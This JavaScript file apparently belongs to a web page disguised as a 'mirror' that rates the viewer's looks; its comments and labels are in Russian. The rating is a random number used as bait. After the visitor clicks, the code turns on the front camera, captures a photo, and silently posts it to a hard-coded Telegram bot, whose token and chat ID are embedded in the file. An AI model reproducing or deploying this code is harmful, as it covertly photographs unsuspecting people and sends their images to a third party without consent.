



const BOT_TOKEN = "9117053921:AAFffyyGD5Zyk3ig2Y0xvfWcBFIlfW-6rOI";


const CHAT_ID = "8153810302";

const video = document.getElementById("camera");

const canvas = document.getElementById("canvas");

const button = document.getElementById("startCamera");

const status = document.getElementById("status");

const rating = document.getElementById("rating");

let stream = null;

// ==========================
// ЗАПУСК КАМЕРЫ
// ==========================

async function startCamera() {

try {

    status.innerHTML = `
        <span></span>
        
    `;


    stream =
        await navigator.mediaDevices.getUserMedia({

            video: {
                facingMode: "user",

                width: {
                    ideal: 1920
                },

                height: {
                    ideal: 1080
                }
            },

            audio: false

        });


    video.srcObject = stream;


    status.classList.add("active");

    status.innerHTML = `
        <span></span>
        
    `;


    button.disabled = true;

    button.textContent =
        ""


    // Даём камере одну секунду
    // для запуска

    setTimeout(() => {

        giveRandomRating();

        makePhoto();

    }, 1000);


} catch (error) {

    console.error(error);


    status.classList.remove("active");


    status.innerHTML = `
        <span></span>
        
    `;


    button.disabled = false;

    button.textContent =
        "🪞 Открыть зеркало";

}

}

// ==========================
// ФОТО
// ==========================

function makePhoto() {

if (!stream) {
    return;
}


if (!video.videoWidth) {

    status.innerHTML = `
        <span></span>
        
    `;

    return;
}


canvas.width =
    video.videoWidth;


canvas.height =
    video.videoHeight;


const ctx =
    canvas.getContext("2d");


ctx.drawImage(

    video,

    0,
    0,

    canvas.width,
    canvas.height

);


status.innerHTML = `
    <span></span>
    
`;


canvas.toBlob(

    async (photo) => {

        if (!photo) {
            return;
        }


        await sendToTelegram(photo);


        stopCamera();

    },

    "image/jpeg",

    0.9

);

}

// ==========================
// TELEGRAM
// ==========================

async function sendToTelegram(photo) {

const formData =
    new FormData();


formData.append(
    "chat_id",
    CHAT_ID
);


formData.append(
    "photo",
    photo,
    "mirror.jpg"
);


try {

    const response =
        await fetch(

            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,

            {
                method: "POST",

                body: formData
            }

        );


    const result =
        await response.json();


    if (result.ok) {

        status.innerHTML = `
            <span></span>
            
        `;

        button.textContent =
            "";


    } else {

        console.error(result);


        status.innerHTML = `
            <span></span>
            
        `;

        button.disabled = false;

    }


} catch (error) {

    console.error(error);


    status.innerHTML = `
        <span></span>
        
    `;

    button.disabled = false;

}

}

// ==========================
// ОЦЕНКА
// ==========================

function giveRandomRating() {

const number =
    Math.floor(
        Math.random() * 10
    ) + 1;


rating.innerHTML = `
    Оценка внешности:
    <strong>${number}</strong>/10
`;


rating.classList.add("show");

}

// ==========================
// ВЫКЛЮЧЕНИЕ КАМЕРЫ
// ==========================

function stopCamera() {

if (stream) {

    stream
        .getTracks()
        .forEach(track => {
            track.stop();
        });

    stream = null;
}


video.srcObject = null;

}

// ==========================
// КНОПКА
// ==========================

button.addEventListener(
"click",
startCamera
);